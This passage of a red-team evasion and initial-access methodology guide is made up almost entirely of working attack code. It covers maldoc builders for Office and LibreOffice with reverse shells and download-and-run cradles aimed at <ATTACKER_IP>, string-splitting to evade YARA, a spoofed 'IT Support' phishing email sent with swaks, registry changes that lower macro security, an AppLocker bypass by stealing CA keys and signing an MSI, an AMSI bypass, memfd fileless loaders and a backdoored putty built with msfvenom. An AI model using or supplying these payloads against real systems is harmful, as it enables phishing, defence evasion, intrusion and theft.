//   4. NtCreateSection(SEC_IMAGE) on transacted file handle
//   5. RollbackTransaction → file never committed to disk
//   6. NtCreateProcessEx(section) → spawn from in-memory image, no on-disk artifact
//   7. NtCreateThreadEx → resume
```

[↑ top](#table-of-contents)

---

## Phase 10: Defender-Specific Hunting Tools

Use these in your **own** lab to iteratively reduce signatures from a payload.

### ThreatCheck

```bash
# Bisects file, identifies signatured byte range
ThreatCheck.exe -f payload.exe
ThreatCheck.exe -f script.ps1 -e AMSI
```

### AmsiTrigger

```bash
# Identifies the precise PowerShell script string that AMSI flags
AmsiTrigger.exe -i script.ps1
AmsiTrigger.exe -i script.ps1 -f 4    # output mode
```

### defender-check / DefenderCheck

```bash
# Same as ThreatCheck — bisect approach
DefenderCheck.exe payload.exe
```

### Workflow

```text
1. Generate payload
2. Run AmsiTrigger / ThreatCheck → identify signatured strings/regions
3. Refactor / encode the signatured portions
4. Re-test until clean
5. Validate against full vendor stack on isolated VM
```

### 10b. InvisibilityCloak — C# Source-Level Obfuscation

Pre-compilation string/symbol obfuscation for C# offensive tools (Rubeus, Seatbelt, SharpHound, Certify). Rewrites class names, method names, GUID attributes, and string literals before `csc` ever sees them — bypasses static signatures that key on known tool identifiers.

```bash
# Usage (run on attacker Linux/Windows with Python3 — no pip install needed, pure stdlib)
# Repo already on Kali at /opt/InvisibilityCloak or cloned locally
python3 InvisibilityCloak.py -d /path/to/SharpTool/ -m reverse
python3 InvisibilityCloak.py -d /path/to/SharpTool/ -m base64
python3 InvisibilityCloak.py -d /path/to/SharpTool/ -m rot13

# Modes:
#   reverse — reverses all identifiers and string literals (fastest, least entropy change)
#   base64  — base64-encodes strings, inserts runtime decode stubs
#   rot13   — ROT13 on identifiers + strings
```

```bash
# Full pipeline: obfuscate Rubeus source → compile → donut → loader
python3 InvisibilityCloak.py -d ./Rubeus/ -m base64
cd Rubeus && dotnet build -c Release
donut -i bin/Release/Rubeus.exe -o rubeus_cloak.bin
# Load rubeus_cloak.bin via any Phase 4/6/7 loader
```

```bash
# Combine with ThreatCheck iterative reduction
python3 InvisibilityCloak.py -d ./Certify/ -m rot13
cd Certify && csc /target:exe /out:Certify_obf.exe *.cs
ThreatCheck.exe -f Certify_obf.exe
# If still flagged: re-run with different mode or manually rename remaining signatured identifiers
```

#### Living-off-the-land / LOTL variant

No native OS equivalent exists for automated C# source obfuscation. Manual LOTL approach using only `sed`/`find` (Linux) or PowerShell string replacement (Windows):

```bash
# Linux — bulk rename a known-signatured class name across all .cs files
find ./Rubeus/Rubeus/ -name "*.cs" -exec sed -i 's/Roast/R04st/g' {} +
find ./Rubeus/Rubeus/ -name "*.cs" -exec sed -i 's/Kerberos/K3rb3r0s/g' {} +
find ./Rubeus/Rubeus/ -name "*.cs" -exec sed -i 's/Rubeus/Rub3us/g' {} +
# Also rename the .csproj AssemblyName and namespace references
sed -i 's/<AssemblyName>Rubeus</<AssemblyName>Rub3us</g' ./Rubeus/Rubeus/Rubeus.csproj
```

```powershell
# Windows — same via PowerShell (no external tools)
Get-ChildItem -Path .\Rubeus\ -Filter *.cs -Recurse | ForEach-Object {
    (Get-Content $_.FullName) -replace 'Rubeus','Rub3us' -replace 'Roast','R04st' | Set-Content $_.FullName
}
# Rename assembly metadata in .csproj
(Get-Content .\Rubeus\Rubeus.csproj) -replace 'Rubeus','Rub3us' | Set-Content .\Rubeus\Rubeus.csproj
```

---

## Phase 11: Office Macros & Document Lures

### macro_pack

```bash
# Generate VBA macro doc with builtin obfuscation
macro_pack -G out.docm -t WEBMETER --webdav-url http://<ATTACKER_IP>/payload
echo 'Sub AutoOpen()
    Shell "powershell -nop -w hidden -c IEX(IWR http://<ATTACKER_IP>/p.ps1 -UseBasicParsing)"
End Sub' | macro_pack -o -G out.doc
```

### EvilClippy

```bash
# Stomp VBA P-code (hide source from analysts; macro still runs)
EvilClippy.exe -s decoy.vba -t 2010 input.doc
EvilClippy.exe -gg input.doc          # remove module attributes
```

### XLL (Excel native addin)

XLLs are DLLs Excel loads with `xlAutoOpen` entry point. Bypass MOTW only when not from internet zone — limited usefulness post-2024 Excel default block.

### Manual VBA Skeleton

```vba
Sub AutoOpen()
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    sh.Run "powershell -nop -w hidden -c " & _
           "IEX((New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/p.ps1'))", 0, False
End Sub

Sub Document_Open()
    AutoOpen
End Sub
```

> Modern Office disables macros from internet zone by default (2022+). Combine with **container delivery** (ISO/IMG) to strip Mark-of-the-Web, OR use **template injection** (DOCX → remote `.dotm`) for limited bypass.

### OpenOffice / LibreOffice StarBasic Maldoc (.odt)

Cross-platform alternative to MS Office VBA — fires when target has LibreOffice/OpenOffice but no Word. StarBasic `Shell()` spawns child of `soffice.bin` (telemetry-loud).

```bash
# Metasploit module — auto-generates .odt with embedded StarBasic macro
# Module: exploit/multi/misc/openoffice_document_macro
msfconsole -q -x "use exploit/multi/misc/openoffice_document_macro; \
set PAYLOAD windows/x64/shell_reverse_tcp; \
set LHOST <ATTACKER_IP>; set LPORT <ATTACKER_PORT>; \
set FILENAME lure.odt; exploit; exit"
```

### Manual payload swap — .odt is a zip

```bash
# Rename + extract to edit the StarBasic module by hand
cp lure.odt lure.zip
unzip lure.zip -d odt_extract

# Macro lives at Basic/Standard/Module1.xml — StarBasic, NOT VBA
# Replace auto-generated PowerShell with CLM-safe / bespoke command
cat > odt_extract/Basic/Standard/Module1.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">REM  *****  BASIC  *****

Sub OnLoad
    Dim os as string
    os = GetOS
    If os = &quot;windows&quot; Then
        Exploit
    End If
End Sub

Sub Exploit
    Shell(&quot;cmd.exe /C powershell.exe -nop -w hidden -c IEX(IWR http://<ATTACKER_IP>:<ATTACKER_PORT>/p.ps1 -UseBasicParsing)&quot;)
End Sub

Function GetOS as String
    GetOS = Environ(&quot;OS&quot;)
End Function
</script:module>
EOF

# Repackage — must be zip, NOT tar; preserve mimetype as first entry uncompressed
cd odt_extract && zip -0 -X ../lure_mod.odt mimetype && zip -rq ../lure_mod.odt . -x mimetype && cd ..
```

### Delivery + catch

```bash
# Stage AV-evaded follow-on payload (combine with template injection — see Phase 3)
python3 -m http.server <ATTACKER_PORT>

# Listener
rlwrap nc -lnvp <ATTACKER_PORT>
```

> **OPSEC:** StarBasic `Shell()` ≡ VBA `Shell()` — `cmd.exe`/`powershell.exe` parented to `soffice.bin` is a high-fidelity IOC. Drop the `GetOS` branch if Windows-only (less detonation noise on Linux sandboxes). LO/OO 4.4+ raises a security warning for internet-zone macros — lure-craft accordingly.

> **LOTL caveat:** Native binary — preinstalled on most Linux desktops and shipped in some hardened Windows kiosks. Useful when MS Office is blocked but ODF readers aren't.

### 11a-b. Linux Bash Reverse Shell via LibreOffice StarBasic

When the target is a Linux box with LibreOffice, use `Shell("/bin/bash ...")` instead of `cmd.exe`. Delivers a reverse shell parented to `soffice.bin` without touching PowerShell or Windows APIs.

```bash
# Build .odt with Linux bash reverse shell — headless XML-level approach (no GUI needed)
mkdir -p odt_linux/{META-INF,Basic/Standard}

cat > odt_linux/mimetype <<'EOF'
application/vnd.oasis.opendocument.text
EOF

cat > odt_linux/META-INF/manifest.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0">
  <manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.text"/>
  <manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="Basic/Standard/Module1.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="Basic/script-lc.xml" manifest:media-type="text/xml"/>
</manifest:manifest>
EOF

cat > odt_linux/content.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
  xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"
  xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0"
  xmlns:xlink="http://www.w3.org/1999/xlink" office:version="1.2">
  <office:scripts>
    <office:event-listeners>
      <script:event-listener script:language="ooo:Basic" script:event-name="dom:load"
        xlink:href="vnd.sun.star.script:Standard.Module1.OnLoad?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts>
  <office:body><office:text><text:p>Please enable macros to view this document.</text:p></office:text></office:body>
</office:document-content>
EOF

cat > odt_linux/Basic/script-lc.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<library:libraries xmlns:library="http://openoffice.org/2000/library" xmlns:xlink="http://www.w3.org/1999/xlink">
  <library:library library:name="Standard" library:link="false"/>
</library:libraries>
EOF

cat > odt_linux/Basic/Standard/Module1.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">REM  *****  BASIC  *****

Sub OnLoad
    Shell("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'")
End Sub
</script:module>
EOF

# Package as .odt (mimetype must be first entry, stored uncompressed)
cd odt_linux && zip -0 -X ../phish_linux.odt mimetype && zip -rq ../phish_linux.odt . -x mimetype && cd ..
```

```bash
# Delivery via swaks (SMTP on attacker box — common in exam labs with mail relay)
swaks --to <TARGET_EMAIL> --from "IT Support <support@<DOMAIN>>" \
  --header "Subject: Q3 Report" --body "Please review attached." \
  --attach phish_linux.odt --server <SMTP_SERVER>
```

```bash
# Catch reverse shell
rlwrap nc -lnvp <ATTACKER_PORT>
```

#### Living-off-the-land / LOTL variant

The macro itself IS the LOTL vector (LibreOffice is the pre-installed binary). For building the .odt without any external tools beyond `zip` (present on all Linux/macOS):

```bash
# Pure shell — write Module1.xml inline, no python/pip/msf needed
# (same commands as above — mkdir + cat + zip are all coreutils/busybox)
```

### 11a-c. MacroSecurityLevel Registry Bypass (Pre-Stage for Macro Execution)

If you already have code execution on a Windows target (e.g., RCE via web app, WinRM, or lateral movement) and need to ensure a follow-on LibreOffice macro payload executes without the security prompt, lower the `MacroSecurityLevel` via registry before delivering the .odt lure.

```cmd
REM Lower LibreOffice macro security to 0 (run all macros without prompt) — per-machine policy
reg add "HKLM\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel" /v "Value" /t REG_DWORD /d 0 /f

REM Per-user variant (no admin required)
reg add "HKCU\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel" /v "Value" /t REG_DWORD /d 0 /f
```

```powershell
# PowerShell equivalent
New-Item -Path "HKLM:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel" -Name "Value" -Value 0 -Type DWord

# HKCU variant (no elevation needed)
New-Item -Path "HKCU:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel" -Force
Set-ItemProperty -Path "HKCU:\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel" -Name "Value" -Value 0 -Type DWord
```

```cmd
REM Verify the change took effect
reg query "HKLM\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel" /v Value
REM Expected output: Value    REG_DWORD    0x0
```

#### Living-off-the-land / LOTL variant

`reg.exe` and PowerShell `Set-ItemProperty` are both built-in Windows binaries — no external tools needed. This IS the LOTL method. Alternative via `wmic` (legacy, pre-Win11):

```cmd
REM wmic alternative for older hosts (deprecated but functional)
wmic /namespace:\\root\default path SystemRestore call Disable
REM (wmic cannot write arbitrary registry — reg.exe is the true native path here)
```

### 11a-d. ODS Event Handler Binding + Variable-Splitting YARA Evasion

For `.ods` (spreadsheet) payloads: bind the macro to the "Open Document" event via `META-INF/manifest.xml` event registration, and split command strings across multiple Basic variables to evade YARA rules that match on contiguous `/bin/bash` or `powershell` strings.

```bash
# Build .ods with event-bound macro + variable-splitting evasion
mkdir -p ods_payload/{META-INF,Basic/Standard}

cat > ods_payload/mimetype <<'EOF'
application/vnd.oasis.opendocument.spreadsheet
EOF

cat > ods_payload/META-INF/manifest.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0">
  <manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.spreadsheet"/>
  <manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="Basic/Standard/Module1.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="Basic/script-lc.xml" manifest:media-type="text/xml"/>
</manifest:manifest>
EOF

# Event binding: register macro to fire on document open
cat > ods_payload/content.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
  xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0"
  xmlns:dom="http://www.w3.org/2001/xml-events"
  xmlns:xlink="http://www.w3.org/1999/xlink"
  xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" office:version="1.2">
  <office:scripts>
    <office:event-listeners>
      <script:event-listener script:language="ooo:Basic" script:event-name="dom:load"
        xlink:href="vnd.sun.star.script:Standard.Module1.OnLoad?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts>
  <office:body><office:spreadsheet><table:table table:name="Sheet1"/></office:spreadsheet></office:body>
</office:document-content>
EOF

cat > ods_payload/Basic/script-lc.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<library:libraries xmlns:library="http://openoffice.org/2000/library" xmlns:xlink="http://www.w3.org/1999/xlink">
  <library:library library:name="Standard" library:link="false"/>
</library:libraries>
EOF

# Variable-splitting evasion: no single string contains full command
cat > ods_payload/Basic/Standard/Module1.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">REM  *****  BASIC  *****

Sub OnLoad
    Dim a As String
    Dim b As String
    Dim c As String
    Dim d As String
    a = "/bin/ba"
    b = "sh -c '"
    c = "bash -i >& /dev/tc"
    d = "p/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'"
    Shell(a &amp; b &amp; c &amp; d)
End Sub
</script:module>
EOF

cd ods_payload && zip -0 -X ../phish.ods mimetype && zip -rq ../phish.ods . -x mimetype && cd ..
```

```bash
# Windows variant with variable-split powershell (same ODS structure, different Module1.xml payload)
cat > ods_payload/Basic/Standard/Module1.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">REM  *****  BASIC  *****

Sub OnLoad
    Dim a As String
    Dim b As String
    Dim c As String
    a = "cm" &amp; "d.e" &amp; "xe"
    b = " /C power" &amp; "shell.exe -no" &amp; "p -w hid"
    c = "den -c IEX(IWR http://<ATTACKER_IP>:<ATTACKER_PORT>/p.ps1 -UseB" &amp; "asicParsing)"
    Shell(a &amp; b &amp; c)
End Sub
</script:module>
EOF

cd ods_payload && zip -0 -X ../phish_win.ods mimetype && zip -rq ../phish_win.ods . -x mimetype && cd ..
```

> **UI binding method (alternative to XML):** Open the .ods in LibreOffice GUI > Tools > Customize > Events tab > "Open Document" event > Assign Macro > select Standard.Module1.OnLoad > OK > Save. This writes the same `office:event-listeners` XML block shown above. The headless XML approach above is preferred for exam speed.

#### Living-off-the-land / LOTL variant

Building the .ods requires only `mkdir`, `cat`, and `zip` — all present in base Linux/macOS installs. No Python, no Metasploit, no pip packages needed. The variable-splitting technique is pure StarBasic string concatenation evaluated at runtime — no external tooling.

```bash
# Verify YARA evasion: the assembled .ods zip should NOT contain "/bin/bash" as a contiguous string
strings phish.ods | grep -i "/bin/bash"   # should return nothing
strings phish.ods | grep -i "powershell"  # should return nothing (Windows variant)
```

[↑ top](#table-of-contents)

---

## Phase 11b: AppLocker Publisher-Rule Bypass — Recovered CA Signing Key

When AppLocker enforces a `FilePublisherRule` trusting an internal CA, recover the CA's signing key, mint a child code-signing cert, build an MSI with WiX, and sign it — the policy treats it as authorized.

```cmd
REM Step 1 — enumerate effective AppLocker policy on target (confirm publisher rule + identify trusted issuer)
REG EXPORT HKLM\Software\Policies\Microsoft\Windows\SrpV2\Msi    AppLocker-MSI.reg
REG EXPORT HKLM\Software\Policies\Microsoft\Windows\SrpV2\Exe    AppLocker-EXE.reg
REG EXPORT HKLM\Software\Policies\Microsoft\Windows\SrpV2\Script AppLocker-Script.reg
type AppLocker-MSI.reg
REM Look for: <FilePublisherRule PublisherName="*" ProductName="*" BinaryName="*" ...>
```

```powershell
# Same enumeration via PowerShell — read the live effective policy
Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections | Format-List
Get-AppLockerPolicy -Effective -Xml | Out-File AppLocker.xml
```

```cmd
REM Step 2 — locate and exfil the issuing CA cert + private key (writable shares, dev folders, certs dirs)
dir /s /b C:\*.pvk D:\*.pvk 2>nul
dir /s /b C:\*.pfx D:\*.pfx 2>nul
dir /s /b C:\*.p12 D:\*.p12 2>nul
dir /s /b C:\*<CA_NAME>* D:\*<CA_NAME>* 2>nul

REM Exfil via base64 over text channel
C:\path\to\openssl.exe base64 -in <CA_NAME>.cer
C:\path\to\openssl.exe base64 -in <CA_NAME>.pvk
```

```bash
# Attacker side — decode back to binary
openssl base64 -d -in <CA_NAME>.cer.b64 -out <CA_NAME>.cer
openssl base64 -d -in <CA_NAME>.pvk.b64 -out <CA_NAME>.pvk
```

```powershell
# Step 3 — build MSI with WiX on attacker Windows VM
# https://github.com/wixtoolset/wix3/releases — wix311-binaries.zip
@'
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="<APP_PATH>" Version="0.0.1" Manufacturer="Lab" Language="1033">
    <Package InstallerVersion="200" Compressed="yes"/>
    <Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLDIR" Name="Example">
          <Component Id="AppFiles" Guid="12345678-1234-1234-1234-222222222222">
            <File Id="App1" Source="example.exe"/>
          </Component>
        </Directory>
      </Directory>
    </Directory>
    <Feature Id="DefaultFeature" Level="1"><ComponentRef Id="AppFiles"/></Feature>
    <CustomAction Id="shellex" Directory="TARGETDIR" Impersonate="no" ExeCommand='cmd.exe /c <USER_INPUT>' Return="check"/>
    <InstallExecuteSequence><Custom Action="shellex" After="InstallFiles"/></InstallExecuteSequence>
  </Product>
</Wix>
'@ | Out-File -Encoding ascii exec.wxs

copy C:\Windows\notepad.exe example.exe
.\candle.exe exec.wxs
.\light.exe  exec.wixobj                      # produces exec.msi
```

```cmd
REM Step 4 — mint code-signing cert from recovered CA, convert to PFX, sign MSI
set KIT=C:\Program Files (x86)\Windows Kits\10\bin\10.0.22621.0\x64
"%KIT%\makecert.exe" -pe -n "CN=<CA_NAME>-SPC" -a sha256 -cy end -sky signature ^
   -ic <CA_NAME>.cer -iv <CA_NAME>.pvk -sv MySPC.pvk MySPC.cer
REM (press 'None' on private-key password prompt)
"%KIT%\pvk2pfx.exe"  -pvk MySPC.pvk -spc MySPC.cer -pfx MySPC.pfx
ren exec.msi exec-signed.msi
"%KIT%\signtool.exe" sign /v /f MySPC.pfx exec-signed.msi
"%KIT%\signtool.exe" verify /pa /v exec-signed.msi
```

```cmd
REM Step 5 — deliver to target and trigger
msiexec /quiet /qn /i C:\path\to\exec-signed.msi
REM Or stage via attacker HTTP server:
msiexec /quiet /qn /i http://<ATTACKER_IP>:<ATTACKER_PORT>/exec-signed.msi
```

> **Tip:** replicate AppLocker locally before delivery — Win Server eval VM, `certutil -addstore Root <CA_NAME>.cer`, set Application Identity service Automatic, configure the same publisher rule, restart, dry-run the signed MSI. Saves wasted shots on the real target.

> **OPSEC:** signtool stamps the SPC subject (`CN=<CA_NAME>-SPC`) into the MSI signature; defenders cross-checking against legitimate CA-issued cert records will spot the unauthorized SPC. For Purple-team detection-validation this is the desired IOC. For red-team work prefer signing CAs that match the org's normal posture (internal PKI, AD CS code-signing template — see [ESC1](active-directory-methodology.md#62-esc1-misconfigured-certificate-templates) / [ESC4](active-directory-methodology.md#63-esc4-vulnerable-certificate-template-acls) in active-directory-methodology.md).

[↑ top](#table-of-contents)

---

## LOTL Emphasis — In-Memory Everything

Whenever a tool exists as a binary, ask: can I load it reflectively instead?

### Patterns

```powershell
# 1. Download .NET assembly bytes → reflective load
$b=(IWR http://<ATTACKER_IP>/SharpHound.exe -UseBasicParsing).Content
[Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,,@('-c','All'))

# 2. Download script → IEX (after AMSI bypass)
IEX(IWR http://<ATTACKER_IP>/PowerView.ps1 -UseBasicParsing)

# 3. Download shellcode → VirtualAlloc → CreateThread
$sc=(IWR http://<ATTACKER_IP>/donut.bin -UseBasicParsing).Content
# (use Add-Type w/ VirtualAlloc/CreateThread P/Invoke; full PoC = SharpShellcodeRunner.ps1)

# 4. base64-embed payload directly in script
$b64="<long base64 .NET assembly>"
[Reflection.Assembly]::Load([Convert]::FromBase64String($b64)).EntryPoint.Invoke($null,,@(''))
```

### Linux LOTL

```bash
# Run binary from memory via memfd (no disk artifact)
# Requires kernel >= 3.17
URL=http://<ATTACKER_IP>/payload
curl -s $URL -o /dev/null            # warm cache (optional)

# memfd loader using bash + python
python3 -c '
import ctypes, os, sys, urllib.request
libc = ctypes.CDLL(None)
fd = libc.memfd_create(b"x", 0)
data = urllib.request.urlopen("http://<ATTACKER_IP>/payload").read()
os.write(fd, data)
os.execv(f"/proc/self/fd/{fd}", ["x"])'

# fexecve via perl
perl -e 'use Fcntl; my $fd=syscall(319,"x",0); open(F,">&=$fd") or die; print F `curl -s http://<ATTACKER_IP>/p`; exec {"/proc/$$/fd/$fd"} "x"'
```

```bash
# linux-inject — inject SO into running process (LOTL alternative to commercial loaders)
gcc -fPIC -shared -o evil.so evil.c
linux-inject -p $(pgrep target) -l ./evil.so
```

---

## Quick Reference Cheatsheet

```bash
# Pre-launch (PowerShell session)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Convert PE → shellcode
donut -i payload.exe -o donut.bin

# Encode shellcode (modern)
sgn -a 64 -c 50 -i donut.bin -o final.bin

# Inject into legit binary
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=443 \
  -x putty.exe -k -f exe -o putty_x.exe

# Pure LOTL .NET reflective load (no disk)
$b=(IWR http://<ATTACKER_IP>/Rubeus.exe -UseBasicParsing).Content
[Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,,@('kerberoast'))

# Squiblydoo
regsvr32 /s /n /u /i:http://<ATTACKER_IP>/p.sct scrobj.dll

# Iterative AV reduction
ThreatCheck.exe -f payload.exe
AmsiTrigger.exe -i script.ps1

# Linux memfd execution
python3 -c 'import ctypes,os,urllib.request as u; l=ctypes.CDLL(None); fd=l.memfd_create(b"x",0); os.write(fd,u.urlopen("http://<ATTACKER_IP>/p").read()); os.execv(f"/proc/self/fd/{fd}",["x"])'
```
